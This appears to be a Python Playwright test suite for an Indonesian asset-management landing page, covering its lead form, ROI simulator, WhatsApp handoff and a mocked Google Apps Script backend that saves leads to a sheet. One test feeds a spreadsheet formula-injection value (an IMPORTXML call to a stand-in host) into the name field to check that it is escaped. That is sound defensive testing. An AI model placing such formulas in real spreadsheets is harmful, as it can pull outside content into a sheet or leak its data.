import json
import threading
import unittest
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.parse import parse_qs, urlparse

from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parents[1]
APPS_SCRIPT = ROOT / 'google-apps-script' / 'Code.gs'
SHEET_RESPONSE = ROOT / 'google-apps-script' / 'Response.html'


class LeadFlowHandler(SimpleHTTPRequestHandler):
    status = 'success'
    payload = None
    payloads = []
    payload_lock = threading.Lock()

    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=str(ROOT), **kwargs)

    def do_GET(self):
        request = urlparse(self.path)
        if request.path in ('/index.html', '/index-v2.html'):
            source_path = '/index-v2.html' if request.path == '/index.html' else request.path
            html = (ROOT / source_path.lstrip('/')).read_text(encoding='utf-8')
            html = html.replace('data-lead-endpoint="https://script.google.com/macros/s/AKfycby-vKKQm6JI0p5oP1Ku0U28ODJJsuu1aBRdcObxlWJtahYDqlIMy09OjkKt6KhprMpQ/exec"', f'data-lead-endpoint=""' if 'without-endpoint' in request.query else f'data-lead-endpoint="http://127.0.0.1:{self.server.server_port}/apps-script"')
            html = html.replace('<script src="aseta-self-serve-v2.js"></script>', '<script src="/aseta-self-serve-v2.js"></script>')
            body = html.encode()
            self.send_response(200); self.send_header('Content-Type', 'text/html; charset=utf-8'); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body); return
        if request.path == '/nested':
            params = parse_qs(request.query)
            result = json.loads(params['result'][0]); origin = json.loads(params['origin'][0])
            body = f'<script>parent.postMessage({json.dumps(result)},{json.dumps(origin)});</script>'.encode()
            self.send_response(200); self.send_header('Content-Type', 'text/html'); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body); return
        super().do_GET()

    def do_POST(self):
        if urlparse(self.path).path != '/apps-script': self.send_error(404); return
        length = int(self.headers.get('Content-Length', '0'))
        payload = parse_qs(self.rfile.read(length).decode())
        with self.payload_lock:
            type(self).payload = payload; type(self).payloads.append(payload)
        origin_url = urlparse(payload.get('source', [''])[0]); origin = f'{origin_url.scheme}://{origin_url.netloc}'
        result = json.dumps({'type':'aseta-lead-result','status':type(self).status,'requestId':payload.get('request_id',[''])[0],'attemptId':payload.get('attempt_id',[''])[0]})
        body = f'<!doctype html><script>parent.postMessage({result},{json.dumps(origin)});</script>'.encode()
        self.send_response(200); self.send_header('Content-Type','text/html; charset=utf-8'); self.send_header('Content-Length',str(len(body))); self.end_headers()
        try: self.wfile.write(body)
        except ConnectionAbortedError: pass

    def log_message(self, *_args): pass


class LeadFlowTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = ThreadingHTTPServer(('127.0.0.1', 0), LeadFlowHandler)
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True); cls.thread.start()
        cls.playwright = sync_playwright().start(); cls.browser = cls.playwright.chromium.launch(headless=True)

    @classmethod
    def tearDownClass(cls):
        cls.browser.close(); cls.playwright.stop(); cls.server.shutdown(); cls.server.server_close(); cls.thread.join()

    def setUp(self):
        LeadFlowHandler.status = 'success'; LeadFlowHandler.payload = None; LeadFlowHandler.payloads = []
        self.context = self.browser.new_context(accept_downloads=True); self.page = self.context.new_page()
        self.page.route('http://127.0.0.1/**', lambda route: self._mock_local_apps_script(route))
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index.html#simulator')

    def _mock_local_apps_script(self, route):
        if urlparse(route.request.url).path != '/apps-script':
            route.continue_(); return
        payload = parse_qs(route.request.post_data or '')
        with LeadFlowHandler.payload_lock:
            LeadFlowHandler.payload = payload; LeadFlowHandler.payloads.append(payload)
        origin_url = urlparse(payload.get('source', [''])[0]); origin = f'{origin_url.scheme}://{origin_url.netloc}'
        result = json.dumps({'type':'aseta-lead-result','status':LeadFlowHandler.status,'requestId':payload.get('request_id',[''])[0],'attemptId':payload.get('attempt_id',[''])[0]})
        wrapper = f'<!doctype html><iframe src="/nested?result={json.dumps(result)}&origin={json.dumps(origin)}"></iframe>'
        route.fulfill(status=200, body=wrapper, content_type='text/html')

    def _mock_nested(self, route):
        from urllib.parse import unquote
        params = parse_qs(urlparse(route.request.url).query)
        result = json.loads(unquote(params['result'][0])); origin = json.loads(unquote(params['origin'][0]))
        body = f'<script>parent.postMessage({json.dumps(result)},{json.dumps(origin)});</script>'
        route.fulfill(status=200, body=body, content_type='text/html')

    def tearDown(self): self.context.close()

    def open_form(self):
        self.page.locator('#download-pdf').click(); self.assertTrue(self.page.locator('#lead-dialog').evaluate('(d)=>d.open'))

    def fill_form(self):
        values={'name':'Alya Pratama','email':'alya@example.co.id','company':'PT Contoh Nusantara','position':'Manajer Maintenance','phone':'0817 2233 4455'}
        for key,value in values.items(): self.page.locator(f'#simulator-lead-form [name="{key}"]').fill(value)
        self.page.locator('[name="consent"]').check(); return values

    def run_apps_script(self, params, existing_rows=None, sheet_id='sheet-id'):
        source=APPS_SCRIPT.read_text(encoding='utf-8'); template=SHEET_RESPONSE.read_text(encoding='utf-8')
        return self.page.evaluate('''({source,templateSource,params,existingRows,sheetId})=>{
          const rows=structuredClone(existingRows);let released=false;
          const tmpl=html=>({payload:'',targetOrigin:'',evaluate(){const rendered=html.replace('<?!= payload ?>',this.payload).replace('<?!= targetOrigin ?>',this.targetOrigin);return{html:rendered,setXFrameOptionsMode(){return this;}};}});
          const sheet={
            getLastColumn:()=>Math.max(0,...rows.map(row=>row.length)),
            getLastRow:()=>rows.length,
            insertColumnBefore:(column)=>rows.forEach(row=>row.splice(column-1,0,'')),

            getRange:(row,column,count=1,width=1)=>({
              getValues:()=>rows.slice(row-1,row-1+count).map(values=>Array.from({length:width},(_,index)=>values[column-1+index]??'')),
              setValues:values=>values.forEach((valuesRow,index)=>{rows[row-1+index]=rows[row-1+index]||[];rows[row-1+index].splice(column-1,valuesRow.length,...valuesRow);}),
              createTextFinder:value=>({matchEntireCell:()=>({findNext:()=>rows.slice(1).some(values=>values[rows[0].length-1]===value)?{}:null})})
            }),
            appendRow:row=>rows.push(row)
          };
          window.HtmlService={XFrameOptionsMode:{ALLOWALL:'ALLOWALL'},createHtmlOutput:html=>({html}),createTemplateFromFile:()=>tmpl(templateSource)};
          window.PropertiesService={getScriptProperties:()=>({getProperty:()=>sheetId})};window.LockService={getScriptLock:()=>({waitLock(){},hasLock:()=>true,releaseLock:()=>{released=true;}})};window.SpreadsheetApp={openById:()=>({getSheetByName:()=>sheet,insertSheet:()=>sheet})};window.console={error(){}};
          const output=new Function('e',`${source}\\nreturn doPost(e);`)({parameter:params});if(!output.html.includes('postMessage'))return{result:null,rows,released};
          const match=output.html.match(/window\\.top\\.parent\\.postMessage\\((\\{.*\\}), (".*")\\);/);return{result:JSON.parse(match[1]),origin:match[2],rows,released};
        }''',{'source':source,'templateSource':template,'params':params,'existingRows':existing_rows or [],'sheetId':sheet_id})

    def test_form_requires_contact_and_consent(self):
        self.open_form(); required=self.page.locator('#simulator-lead-form [required]'); self.assertGreaterEqual(required.count(),5)
        self.assertTrue(self.page.locator('.lead-honeypot [name="website"]').evaluate('(f)=>f.tabIndex===-1'))

    def test_successful_save_downloads_pdf_and_opens_whatsapp(self):
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index.html#simulator')
        self.page.locator('#dt-range').fill('12')
        self.page.locator('#dtcost-range').fill('2500000')
        self.page.locator('#repair-range').fill('15000000')
        self.page.locator('#reduce-range').fill('30')
        self.open_form();values=self.fill_form()
        self.assertEqual(self.page.locator('.lead-phone-field > span').inner_text(), '+62')
        self.assertEqual(self.page.locator('[name="phone"]').input_value(), '81722334455')
        with self.page.expect_download() as info:self.page.locator('#lead-submit').click()
        self.assertTrue(info.value.suggested_filename.endswith('.pdf'));self.assertEqual(LeadFlowHandler.payload['annual_loss'],['540000000'])
        for key,value in values.items():
            if key == 'phone': self.assertEqual(LeadFlowHandler.payload[key], ['6281722334455'])
            else: self.assertEqual(LeadFlowHandler.payload[key],[value])
        self.assertEqual(LeadFlowHandler.payload['position'], ['Manajer Maintenance'])
        with self.page.expect_popup() as popup:self.page.locator('#share-whatsapp').click()
        message=parse_qs(urlparse(popup.value.url).query)['text'][0];self.assertIn(values['name'],message);self.assertIn('lampirkan pdf',message.lower())
        self.assertFalse(self.page.locator('#lead-dialog').evaluate('(d)=>d.open'))
        self.assertEqual(self.page.evaluate('location.hash'), '#top')
        self.assertLessEqual(self.page.evaluate('window.scrollY'), 1)

    def test_v2_has_b2b_context_and_honest_simulator_defaults(self):
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index-v2.html#simulator')
        self.assertEqual(self.page.locator('main h1').count(), 1)
        self.assertIn('maintenance', self.page.locator('.conversion-intro h1').inner_text().lower())
        self.assertTrue(self.page.locator('.conversion-intro a[href="#cek-cocok"]').is_visible())
        self.assertIn('data simulasi', self.page.locator('.conversion-intro').inner_text().lower())
        self.assertIn('masukkan data operasional', self.page.locator('#simulator-disclosure').inner_text().lower())
        self.assertEqual(self.page.locator('#saving-result').inner_text(), 'Rp0')

    def test_v2_whatsapp_handoff_includes_campaign_attribution(self):
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index-v2.html?utm_source=meta&utm_medium=paid_social&utm_campaign=aseta_demo&utm_content=maintenance_ad&utm_term=asset_management#mulai')
        self.page.locator('#sales-name').fill('Alya')
        self.page.locator('#sales-position').fill('Manajer Maintenance')
        self.page.locator('#sales-company').fill('PT A')
        with self.page.expect_popup() as popup:
            self.page.locator('#sales-contact-form button[type="submit"]').click()
        message=parse_qs(urlparse(popup.value.url).query)['text'][0]
        self.assertIn('Sumber kampanye: meta / paid_social / aseta_demo / maintenance_ad / asset_management',message)

    def test_v2_preserves_campaign_attribution_when_saving_lead(self):
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index-v2.html?utm_source=meta&utm_medium=paid_social&utm_campaign=aseta_demo&utm_content=maintenance_ad&utm_term=asset_management&fbclid=click-123#simulator')
        self.open_form(); self.fill_form()
        with self.page.expect_download(): self.page.locator('#lead-submit').click()
        self.assertEqual(LeadFlowHandler.payload['utm_source'], ['meta'])
        self.assertEqual(LeadFlowHandler.payload['utm_medium'], ['paid_social'])
        self.assertEqual(LeadFlowHandler.payload['utm_campaign'], ['aseta_demo'])
        self.assertEqual(LeadFlowHandler.payload['utm_content'], ['maintenance_ad'])
        self.assertEqual(LeadFlowHandler.payload['utm_term'], ['asset_management'])
        self.assertEqual(LeadFlowHandler.payload['fbclid'], ['click-123'])

    def test_v2_subscription_estimator_calculates_qr_year_one_cost_and_roi(self):
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index-v2.html#simulator')
        self.page.locator('#asset-range').fill('450')
        self.page.locator('#subscription-type').select_option('qr')
        self.assertEqual(self.page.locator('#investment-output').inner_text(), 'Rp13,9 jt')
        self.assertEqual(self.page.locator('#investment-breakdown').inner_text(), 'Langganan 12 bulan Rp6,3 jt + hardware & consumables Rp7,6 jt + Enterprise Rp0')
        self.assertNotEqual(self.page.locator('#roi-result').inner_text(), '—')

    def test_v2_subscription_estimator_calculates_rfid_cost_with_tags_and_enterprise(self):
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index-v2.html#simulator')
        self.page.locator('#asset-range').fill('500')
        self.page.locator('#subscription-type').select_option('rfid')
        self.page.locator('#rfid-reader').check()
        self.page.locator('#enterprise-features').fill('2')
        self.assertEqual(self.page.locator('#investment-output').inner_text(), 'Rp43,8 jt')
        self.assertIn('Tag RFID', self.page.locator('#investment-breakdown').inner_text())
        self.assertIn('Enterprise', self.page.locator('#investment-breakdown').inner_text())

    def test_v2_subscription_estimator_does_not_guess_price_for_2000_or_more_assets(self):
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index-v2.html#simulator')
        self.page.locator('#asset-range').fill('2000')
        self.assertEqual(self.page.locator('#investment-output').inner_text(), 'Perlu dikonfirmasi')
        self.assertEqual(self.page.locator('#roi-result').inner_text(), '—')
        self.assertEqual(self.page.locator('#asset-range').get_attribute('max'), '2000')

    def test_v2_roi_calculator_hands_assumptions_to_assessment(self):
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index-v2.html#simulator')
        self.assertEqual(self.page.locator('#investment-output').inner_text(), 'Pilih jumlah aset')
        self.assertEqual(self.page.locator('#roi-result').inner_text(), '—')
        self.assertEqual(self.page.locator('#saving-result').inner_text(), 'Rp0')
        self.assertEqual(self.page.locator('#asset-range').input_value(), '0')
        self.page.locator('#asset-range').fill('450')
        self.assertEqual(self.page.locator('#investment-output').inner_text(), 'Rp13,9 jt')
        self.assertEqual(self.page.locator('#hours-range').input_value(), '0')
        self.assertEqual(self.page.locator('#saved-hours').inner_text(), '0 jam/minggu')
        self.assertEqual(self.page.locator('#dt-range').input_value(), '0')
        self.assertEqual(self.page.locator('#dtcost-range').input_value(), '0')
        self.assertEqual(self.page.locator('#repair-range').input_value(), '0')
        self.assertEqual(self.page.locator('#reduce-range').input_value(), '0')
        self.page.locator('#dt-range').fill('12')
        self.page.locator('#dtcost-range').fill('2500000')
        self.page.locator('#repair-range').fill('15000000')
        self.page.locator('#reduce-range').fill('30')
        self.assertEqual(self.page.locator('#net-benefit-result').inner_text(), 'Rp148,1 jt')
        self.assertEqual(self.page.locator('#roi-result').inner_text(), '1.065%')
        self.assertIn('1 bulan', self.page.locator('#payback-result').inner_text())
        self.page.locator('#reduce-range').fill('50')
        self.assertEqual(self.page.locator('#saving-result').inner_text(), 'Rp270 jt')
        self.assertEqual(self.page.locator('#net-benefit-result').inner_text(), 'Rp256,1 jt')
        self.assertEqual(self.page.locator('#roi-result').inner_text(), '1.841%')

        self.page.click('#assessment-next')
        self.page.locator('input[data-need-id="maintenance"]').check()
        self.page.click('#assessment-next')
        self.page.locator('#profile-assets').select_option(label='201–1.000')
        self.page.locator('#profile-system').select_option(label='Spreadsheet (Excel/Google Sheets)')
        self.page.locator('#profile-branches').select_option(label='2–5 cabang')
        self.page.click('#assessment-submit')
        summary = self.page.locator('#roi-assessment-summary')
        self.assertTrue(summary.is_visible())
        self.assertIn('Rp270 jt/tahun', summary.inner_text())
        self.assertIn('1841%', summary.inner_text())
        self.assertTrue(self.page.locator('#assessment-cta').is_visible())

    def test_failed_sheet_save_never_downloads_pdf(self):
        LeadFlowHandler.status='error';self.open_form();self.fill_form();self.page.locator('#lead-submit').click()
        error=self.page.locator('#lead-error');error.wait_for(state='visible');self.assertIn('belum tersimpan',error.inner_text().lower());self.assertFalse(self.page.locator('#lead-next-step').is_visible())

    def test_missing_endpoint_never_downloads_pdf(self):
        self.page.goto(f'http://127.0.0.1:{self.server.server_port}/index.html?without-endpoint#simulator');self.open_form();self.fill_form();self.page.locator('#lead-submit').click()
        error=self.page.locator('#lead-error');error.wait_for(state='visible');self.assertIn('belum dikonfigurasi',error.inner_text().lower());self.assertFalse(self.page.locator('#lead-next-step').is_visible())

    def test_apps_script_saves_once_escapes_formula_and_restricts_origin(self):
        params={'request_id':'req-1','attempt_id':'try-1','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'=IMPORTXML("https://bad.invalid","//a")','email':'a@b.co','company':'PT A','position':'Manajer','phone':'0812','consent':'yes','downtime':'12','downtime_cost_per_hour':'2500000','reactive_repair_cost_monthly':'15000000','breakdown_reduction_target':'30','annual_loss':'540000000','annual_saving':'162000000'}
        saved=self.run_apps_script(params);self.assertEqual(saved['result']['status'],'success');self.assertEqual(json.loads(saved['origin']),'https://pippoauliaa-dev.github.io');self.assertEqual(saved['rows'][1][1],"'=IMPORTXML(\"https://bad.invalid\",\"//a\")");self.assertEqual(saved['rows'][1][4],'Manajer');self.assertEqual(saved['rows'][1][5],'62812');self.assertEqual(saved['rows'][0][4],'Jabatan');self.assertEqual(saved['rows'][0][5],'WhatsApp');self.assertTrue(saved['released'])
        duplicate=self.run_apps_script(params,saved['rows']);self.assertEqual(len(duplicate['rows']),2)
        params['source']='https://bad.invalid';invalid=self.run_apps_script(params);self.assertIsNone(invalid['result']);self.assertEqual(invalid['rows'],[])

    def test_apps_script_saves_campaign_attribution_with_lead(self):
        params={'request_id':'req-attribution','attempt_id':'try-attribution','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'Alya','email':'alya@example.co.id','company':'PT A','position':'Manajer','phone':'0812','consent':'yes','utm_source':'meta','utm_medium':'paid_social','utm_campaign':'aseta_demo','utm_content':'maintenance_ad','utm_term':'asset_management','fbclid':'click-123'}
        result=self.run_apps_script(params)
        headers=result['rows'][0]
        saved=dict(zip(headers,result['rows'][1]))
        self.assertEqual(saved['Source'],'https://pippoauliaa-dev.github.io')
        self.assertEqual(saved['UTM Source'],'meta')
        self.assertEqual(saved['UTM Medium'],'paid_social')
        self.assertEqual(saved['UTM Campaign'],'aseta_demo')
        self.assertEqual(saved['UTM Content'],'maintenance_ad')
        self.assertEqual(saved['UTM Term'],'asset_management')
        self.assertEqual(saved['Meta Click ID'],'click-123')

    def test_apps_script_adds_position_before_phone_without_losing_existing_values(self):
        headers=['Timestamp','Nama','Email perusahaan','Perusahaan','WhatsApp','Persetujuan','Downtime per bulan (jam)','Biaya downtime per jam (Rp)','Biaya perbaikan reaktif per bulan (Rp)','Target pengurangan breakdown (%)','Estimasi kerugian tahunan (Rp)','Potensi penghematan simulasi per tahun (Rp)','Source','Request ID']
        existing=[headers,['2026-09-29','Nama','a@b.co','PT A','0817 2233 4455','Ya',12,2500000,15000000,30,540000000,162000000,'https://pippoauliaa-dev.github.io','existing-id'],['2026-09-29','Tanpa nomor','empty@b.co','PT Kosong','','Ya',0,0,0,30,0,0,'https://pippoauliaa-dev.github.io','empty-phone-id']]
        params={'request_id':'req-new','attempt_id':'try-new','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'New','email':'new@b.co','company':'PT B','position':'Supervisor','phone':'0812','consent':'yes'}
        result=self.run_apps_script(params,existing_rows=existing)
        self.assertEqual(result['rows'][0][4],'Jabatan')
        self.assertEqual(result['rows'][0][5],'WhatsApp')
        self.assertEqual(result['rows'][0][-7:],['UTM Source','UTM Medium','UTM Campaign','UTM Content','UTM Term','Meta Click ID','Request ID'])
        self.assertEqual(result['rows'][1][-7:],['','','','','','','existing-id'])
        self.assertEqual(result['rows'][2][-7:],['','','','','','','empty-phone-id'])
        self.assertEqual(result['rows'][0][-7:],['UTM Source','UTM Medium','UTM Campaign','UTM Content','UTM Term','Meta Click ID','Request ID'])
        self.assertEqual(result['rows'][1][-7:],['','','','','','','existing-id'])
        self.assertEqual(result['rows'][1][4],'')
        self.assertEqual(result['rows'][1][5],'6281722334455')
        self.assertEqual(result['rows'][1][-1],'existing-id')
        self.assertEqual(result['rows'][2][5],'')
        self.assertEqual(result['rows'][2][-1],'empty-phone-id')
        self.assertEqual(result['rows'][3][4],'Supervisor')
        self.assertEqual(result['rows'][3][5],'62812')

    def test_apps_script_honeypot_discards_bot(self):
        params={'request_id':'bot-1','attempt_id':'try-1','source':'https://pippoauliaa-dev.github.io/aseta-self-serve/','name':'Bot','email':'bot@b.co','company':'Bot','position':'Ops','phone':'62812','consent':'yes','website':'filled'}
        result=self.run_apps_script(params);self.assertEqual(result['result']['status'],'success');self.assertEqual(result['rows'],[])

    def test_phone_normalization_supports_local_international_and_prefix(self):
        self.page.locator('#download-pdf').click()
        phone=self.page.locator('[name="phone"]')
        phone.fill('0817 2233 4455');self.assertEqual(phone.input_value(),'81722334455')
        phone.fill('+62 817-2233-4455');self.assertEqual(phone.input_value(),'81722334455')
        phone.fill('0062 81722334455');self.assertEqual(phone.input_value(),'81722334455')


if __name__=='__main__':unittest.main()
